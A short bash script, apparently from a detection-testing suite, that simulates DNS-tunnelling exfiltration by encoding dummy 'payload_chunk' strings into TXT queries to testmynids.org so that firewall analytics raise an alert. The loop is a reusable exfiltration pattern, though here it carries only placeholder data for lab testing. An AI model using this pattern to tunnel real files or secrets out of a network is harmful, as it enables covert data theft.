#!/usr/bin/env bash
# T1572 — DNS tunneling exfil pattern
# Derived verbatim from SIM-MP-001 step step-03 (../../mp-001-c2-beacon-ngfw-xdr-stitch.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-001/T1572] DNS tunneling exfil pattern"

echo '[MP-001] DNS side: short-TTL TXT queries simulating data exfiltration';
for i in $(seq 1 20); do
  dig +short TXT "exfil-$(echo -n "payload_chunk_$i" | base32 | tr -d = | head -c 30).testmynids.org" @1.1.1.1 > /dev/null || true;
  sleep 1;
done
echo '[*] NGFW DNS analytics should flag anomalous TXT volume with high-entropy labels'
